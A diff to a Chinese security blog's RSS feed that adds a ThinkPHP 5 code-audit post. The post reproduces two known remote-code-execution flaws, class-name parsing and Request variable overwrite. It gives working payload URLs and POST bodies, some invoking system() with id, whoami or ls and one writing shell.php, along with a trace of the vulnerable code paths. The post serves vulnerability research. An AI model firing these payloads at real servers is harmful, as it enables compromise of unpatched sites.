@@ -6,7 +6,166 @@
         <description>Recent content on wh1sper</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <lastBuildDate>Mon, 01 Mar 2021 12:52:11 +0800</lastBuildDate><atom:link href="https://anthem-whisper.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 12 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>thinkphp5代码审计</title>
+        <link>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
+        <pubDate>Fri, 12 Mar 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</guid>
+        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg" alt="Featured image of post thinkphp5代码审计" /&gt;&lt;p&gt;本篇博文会复现大多数tp5的漏洞，持续更新&lt;/p&gt;
+&lt;h2 id=&#34;审计环境搭建&#34;&gt;审计环境搭建&lt;/h2&gt;
+&lt;h3 id=&#34;安装thinkphp&#34;&gt;安装thinkphp&lt;/h3&gt;
+&lt;p&gt;推荐使用composer，版本切换很方便&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将 composer.json 文件的 require 字段设置成如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;quot;require&amp;quot;: {
+    &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;,
+    &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot;
+},
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行 &lt;code&gt;composer update&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;phpstormxdebug调试环境&#34;&gt;PhpStorm+Xdebug调试环境&lt;/h3&gt;
+&lt;p&gt;可以看我另外一篇文章：&lt;a class=&#34;link&#34; href=&#34;https://anthem-whisper.github.io/p/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Debian下PHP Xdebug调试环境搭建&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;框架基本流程&#34;&gt;框架基本流程&lt;/h2&gt;
+&lt;p&gt;讲的很不错：https://paper.seebug.org/888/#_4&lt;/p&gt;
+&lt;h2 id=&#34;rce-类名解析导致任意类方法调用&#34;&gt;RCE-类名解析导致任意类方法调用&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30&lt;/p&gt;
+&lt;p&gt;未开启强制路由&lt;/p&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md&#34;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/888/#poc&#34;&gt;https://paper.seebug.org/888/#poc&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3570&#34;&gt;https://xz.aliyun.com/t/3570&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;5.1.x&lt;/strong&gt; ：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt;
+?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt;
+?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;5.0.x&lt;/strong&gt; ：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;51x类名解析&#34;&gt;5.1.x类名解析&lt;/h3&gt;
+&lt;p&gt;2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150300.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;洞其实不在这里&lt;/p&gt;
+&lt;p&gt;在路由调度的时候：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150307.png&#34; alt=&#34;image-20210224183737791&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;跟进到thinkphp/library/think/route/dispatch/Module.php:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150311.png&#34; alt=&#34;image-20210224183857202&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;跟进controller方法：(thinkphp/library/think/App.php)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150328.png&#34; alt=&#34;image-20210224193234503&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150405.png&#34; alt=&#34;image-20210222221052520&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;这个方法先对&lt;code&gt;$name&lt;/code&gt;(类名)进行判断，当&lt;code&gt;$name&lt;/code&gt;含有&lt;code&gt;\&lt;/code&gt;时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;thinkphp/library/think/Container.php：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150430.png&#34; alt=&#34;image-20210223112805010&#34;  /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/index.php?s=index/think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过自动加载的特性，&lt;code&gt;think\Container&lt;/code&gt;可以直接调用thinkphp/library/think/Container.php的危险方法&lt;code&gt;invokefunction&lt;/code&gt;，造成RCE。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;thinkphp/library/think/Request.php:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150418.png&#34; alt=&#34;image-20210223113330871&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;因为是private，所以查找同一类里面的用例：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Request::input方法：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150443.png&#34; alt=&#34;image-20210223113649493&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;构造poc：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/index.php?s=index/think\request/input&amp;amp;data=1&amp;amp;filter=phpinfo&amp;amp;name=
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Request::cookie方法：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150457.png&#34; alt=&#34;image-20210223114040419&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;构造poc：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/?s=index/think\request/cookie&amp;amp;name=cmd&amp;amp;filter=phpinfo
+[HTTP header]
+Cookie: cmd=1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;同样成功RCE。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;thinkphp/library/think/template/driver/File.php:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150511.png&#34; alt=&#34;image-20210223130238959&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;构造poc：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/?s=index/think\template\driver\file/write&amp;amp;cacheFile=/tmp/test.txt&amp;amp;content=hacked
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功写入/tmp/test.txt文件。&lt;/p&gt;
+&lt;h3 id=&#34;50x类名解析&#34;&gt;5.0.x类名解析&lt;/h3&gt;
+&lt;p&gt;thinkphp/library/think/Loader.php:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150528.png&#34; alt=&#34;image-20210224104838156&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;原理类似，在&lt;code&gt;App::run()&lt;/code&gt;方法里面，&lt;code&gt;Loader::controller&lt;/code&gt;进行调度的时候，当&lt;code&gt;$name&lt;/code&gt;含有&lt;code&gt;\&lt;/code&gt;时会直接将其作为类的命名空间路径，导致我们可以任意方法调用。比如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;thinkphp/library/think/App.php:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150543.png&#34; alt=&#34;image-20210224111256654&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;构造poc:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=assert&amp;amp;vars[1][]=phpinfo()
+http://127.0.0.1/public/?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;eval因为不是函数不能直接回调，在特定php版本情况下可以使用assert直接RCE，或者利用其他函数读写文件。&lt;/p&gt;
+&lt;h3 id=&#34;需要注意的问题&#34;&gt;需要注意的问题&lt;/h3&gt;
+&lt;p&gt;在https://xz.aliyun.com/t/3570#toc-3这篇文章里面提到：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;因为默认配置会判断是否自动转换控制器，将控制器名变成小写&lt;/p&gt;
+&lt;p&gt;又因为&lt;code&gt;Loader.php::autoloadwin&lt;/code&gt;在win环境下严格区分大小写，所以导致有些类加载不到&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是我在Kali下经过小写转换同样也没办法加载到，可能是因为Linux本来就区分大小写？&lt;/p&gt;
+&lt;p&gt;如此一来，着手点只有框架在加载的时候就已经加载的类了&lt;/p&gt;
+&lt;h2 id=&#34;rce-request核心类变量覆盖&#34;&gt;RCE-Request核心类变量覆盖&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ThinkPHP版本：5.0.0&amp;lt;=ThinkPHP5&amp;lt;=5.0.23 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.30&lt;/p&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md&#34;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://php.local/thinkphp5.0.5/public/index.php?s=index
+post
+_method=__construct&amp;amp;method=get&amp;amp;filter[]=call_user_func&amp;amp;get[]=phpinfo
+_method=__construct&amp;amp;filter[]=system&amp;amp;method=GET&amp;amp;get[]=whoami
+
+# ThinkPHP &amp;lt;= 5.0.13
+POST /?s=index/index
+s=whoami&amp;amp;_method=__construct&amp;amp;method=&amp;amp;filter[]=system
+
+# ThinkPHP &amp;lt;= 5.0.23、5.1.0 &amp;lt;= 5.1.16 需要开启框架app_debug
+POST /
+_method=__construct&amp;amp;filter[]=system&amp;amp;server[REQUEST_METHOD]=ls -al
+
+# ThinkPHP &amp;lt;= 5.0.23 需要存在xxx的method路由，例如captcha
+POST /?s=xxx HTTP/1.1
+_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=ls+-al
+_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=ls
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;测试用的payload（版本5.0.10）：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/public/index.php?s=index
+POST:
+_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=whoami
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在App::run()方法进行路由检测的时候，在Route.php大约843行调用&lt;code&gt;$request-&amp;gt;method()&lt;/code&gt;方法&lt;/p&gt;
+&lt;p&gt;thinkphp/library/think/Request.php:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150559.png&#34; alt=&#34;image-20210308164140184&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到有一个可以控制的函数名&lt;code&gt;$_POST[Config::get[&#39;var_method&#39;]&lt;/code&gt;，而&lt;code&gt;var_method&lt;/code&gt;的值在application/config.php里面为&lt;code&gt;_method&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150613.png&#34; alt=&#34;image-20210308164849228&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;于是可以POST传入&lt;code&gt;_method&lt;/code&gt;改变&lt;code&gt;$this-&amp;gt;{$this-&amp;gt;method}($_POST);&lt;/code&gt;达到任意调用此类中的方法&lt;/p&gt;
+&lt;p&gt;而如果调用此类中的&lt;code&gt;__construct&lt;/code&gt;方法：
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150623.png&#34; alt=&#34;image-20210308165349746&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;有一个foreach，可以引起POST数据对Requests对象属性的变量覆盖。&lt;/p&gt;
+&lt;p&gt;在App::run()方法里面，如果我们开启了debug模式，则会调用Request::param()方法：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150633.png&#34; alt=&#34;image-20210309112057671&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;当然，即使没有开启debug，在App::run()里面的调用的exec方法同样也会调用Request::param()方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150643.png&#34; alt=&#34;image-20210309115557269&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;因为调用栈太深，就不一个个跟了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150651.png&#34; alt=&#34;image-20210309115705097&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;这个方法我们需要特别关注了，因为 &lt;strong&gt;Request&lt;/strong&gt; 类中的 &lt;code&gt;param、route、get、post、put、delete、patch、request、session、server、env、cookie、input&lt;/code&gt; 方法均调用了 &lt;strong&gt;filterValue&lt;/strong&gt; 方法，而该方法中就存在可利用的 &lt;strong&gt;call_user_func&lt;/strong&gt; 函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150703.png&#34; alt=&#34;image-20210309113026498&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;不同的payload触发流程不一样，但是核心是一样的。&lt;/p&gt;
+&lt;p&gt;任意方法调用发生在method()，变量覆盖发生在__construct()，rce发生在filterValue()&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150713.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>HGAME 2021 Writeup</title>
         <link>https://anthem-whisper.github.io/p/hgame-2021-writeup/</link>
         <pubDate>Sat, 20 Feb 2021 00:00:00 +0000</pubDate>
